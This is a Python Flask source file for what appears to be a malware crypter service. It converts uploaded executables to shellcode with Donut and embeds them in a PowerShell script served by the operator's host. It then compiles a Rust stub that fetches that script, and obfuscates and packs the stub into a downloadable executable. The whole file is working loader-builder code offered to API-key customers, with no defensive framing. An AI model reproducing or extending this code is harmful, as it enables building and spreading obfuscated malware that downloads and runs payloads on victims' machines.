import os
import json
import donut
import tempfile
import shutil
import subprocess
from flask import Flask, request, jsonify, send_file
from obin_generator import generate_rust_obfuscation

app = Flask(__name__)

# Settings
USERS_FILE = "db/users.json"
TEMPLATE_FILE = "templates/ps_template.ps1"
ALLOWED_EXTENSIONS = {"exe"}

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_next_ps_filename(user_id):
    """Find the next available PS filename."""
    user_ps_dir = f"stubs/{user_id}/ps"
    os.makedirs(user_ps_dir, exist_ok=True)

    existing_files = [f for f in os.listdir(user_ps_dir) if f.startswith("ps") and f.endswith(".ps1")]
    if not existing_files:
        return "ps1.ps1"

    numbers = [int(f[2:-4]) for f in existing_files if f[2:-4].isdigit()]
    next_num = max(numbers) + 1 if numbers else 1
    return f"ps{next_num}.ps1"

@app.route("/api/generator", methods=["POST"])
def generator():
    key = request.args.get("key")

    if not key:
        return jsonify({"error": "No key provided"}), 400

    users = load_users()
    if key not in users:
        return jsonify({"error": "Invalid API key"}), 403

    user_id = users[key]["id"]
    raw_key = users[key]['raw_key']

    if "file" not in request.files:
        return jsonify({"error": "No file uploaded"}), 400

    file = request.files["file"]
    if not file or file.filename == "":
        return jsonify({"error": "Empty filename"}), 400

    if not allowed_file(file.filename):
        return jsonify({"error": "Only .exe files allowed"}), 400

    with tempfile.TemporaryDirectory() as temp_dir:
        build_dir = os.path.join(temp_dir, "build")
        os.makedirs(build_dir)

        # 1. Process user's EXE with Donut to create PowerShell script
        uploaded_exe_path = os.path.join(build_dir, "original.exe")
        file.save(uploaded_exe_path)

        try:
            shellcode = donut.create(file=uploaded_exe_path)
            shellcode_hex = ",".join([f"0x{byte:02x}" for byte in shellcode])
        except Exception as e:
            return jsonify({"error": "Failed to create shellcode with Donut", "details": str(e)}), 500

        with open(TEMPLATE_FILE, "r") as f:
            template = f.read()

        ps_script = template.replace("{{SHELLCODE_PLACEHOLDER}}", shellcode_hex)

        ps_filename = get_next_ps_filename(user_id)
        ps_save_path = f"stubs/{user_id}/ps/{ps_filename}"
        os.makedirs(os.path.dirname(ps_save_path), exist_ok=True)

        with open(ps_save_path, "w") as f:
            f.write(ps_script)

        # This will be used by the stub
        raw_link = f"http://{request.host}/{user_id}/ps/{ps_filename}?raw_key={raw_key}"

        # 2. Compile the stub
        temp_stub_path = os.path.join(build_dir, "stub")
        shutil.copytree("templates/stub", temp_stub_path, ignore=shutil.ignore_patterns('target'))

        stub_main_path = os.path.join(temp_stub_path, "src", "main.rs")
        with open(stub_main_path, "r") as f:
            stub_code = f.read()

        stub_code = stub_code.replace("REPLACE_ME_WITH_RAW_LINK", raw_link)

        with open(stub_main_path, "w") as f:
            f.write(stub_code)

        try:
            subprocess.run(["cargo", "build", "--release"], cwd=temp_stub_path, check=True)
        except subprocess.CalledProcessError as e:
            return jsonify({"error": "Failed to build the stub", "details": str(e)}), 500

        compiled_stub_path = os.path.join(temp_stub_path, "target/release/rust_s.exe")

        # 3. Obfuscate the compiled stub and pack it
        with open(compiled_stub_path, 'rb') as f:
            stub_data = f.read()

        key_rs, payload_rs = generate_rust_obfuscation(stub_data)

        temp_packer_path = os.path.join(build_dir, "packer")
        shutil.copytree("templates/packer", temp_packer_path, ignore=shutil.ignore_patterns('target'))

        packer_main_path = os.path.join(temp_packer_path, "src", "main.rs")
        with open(packer_main_path, "r") as f:
            packer_code = f.read()

        packer_code = packer_code.replace("/*Secret Key Here - replace*/", key_rs)
        packer_code = packer_code.replace("/*Payload Here - replace*/", payload_rs)

        with open(packer_main_path, "w") as f:
            f.write(packer_code)

        try:
            subprocess.run(["cargo", "build", "--release"], cwd=temp_packer_path, check=True)
        except subprocess.CalledProcessError as e:
            return jsonify({"error": "Failed to build the packer", "details": str(e)}), 500

        # 4. Save the final executable
        user_exe_dir = f"stubs/{user_id}/exe"
        os.makedirs(user_exe_dir, exist_ok=True)

        final_exe_filename = f"{user_id}.exe"
        final_exe_path = os.path.join(user_exe_dir, final_exe_filename)
        built_packer_path = os.path.join(temp_packer_path, "target/release/output.exe")
        shutil.move(built_packer_path, final_exe_path)

        download_link = f"/api/download/{user_id}/{final_exe_filename}"

        return jsonify({
            "status": "success",
            "message": "File processed, packed, and ready for download.",
            "download_link": download_link
        })

@app.route("/<user_id>/ps/<ps_filename>")
def get_ps_script(user_id, ps_filename):
    """Serve the PowerShell script with raw_key authentication."""
    raw_key = request.args.get("raw_key")

    if not raw_key:
        return jsonify({"error": "No raw_key provided"}), 400

    users = load_users()

    user_found = False
    for user_data in users.values():
        if user_data.get("raw_key") == raw_key and user_data.get("id") == user_id:
            user_found = True
            break

    if not user_found:
        return jsonify({"error": "Invalid raw_key or user_id"}), 403

    ps_file_path = f"stubs/{user_id}/ps/{ps_filename}"

    if not os.path.exists(ps_file_path):
        return jsonify({"error": "PS script not found"}), 404

    return send_file(ps_file_path, mimetype='text/plain')

@app.route("/api/download/<user_id>/<filename>", methods=["GET"])
def download_file(user_id, filename):
    users = load_users()
    user_found = any(u['id'] == user_id for u in users.values())

    if not user_found:
        return jsonify({"error": "User not found"}), 404

    file_path = os.path.join("stubs", user_id, "exe", filename)

    if not os.path.exists(file_path):
        return jsonify({"error": "File not found"}), 404

    return send_file(file_path, as_attachment=True)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
